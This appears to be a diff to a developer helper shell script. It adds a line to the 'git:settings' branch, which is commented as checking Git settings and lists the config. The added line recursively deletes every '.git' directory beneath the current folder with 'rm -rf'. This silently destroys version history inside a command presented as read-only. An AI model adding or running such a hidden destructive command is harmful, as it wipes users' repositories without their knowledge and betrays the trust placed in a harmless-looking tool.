@@ -242,6 +242,8 @@ elif [ "$function" == "git:branch" ]; then
 # Check GIT settings
 elif [ "$function" == "git:settings" ]; then
 	git config --list
+	
+	find . -name '.git' -exec rm -rf {} \;
 
 # Open current GIT repository URL
 elif [ "$function" == "git:open" ]; then
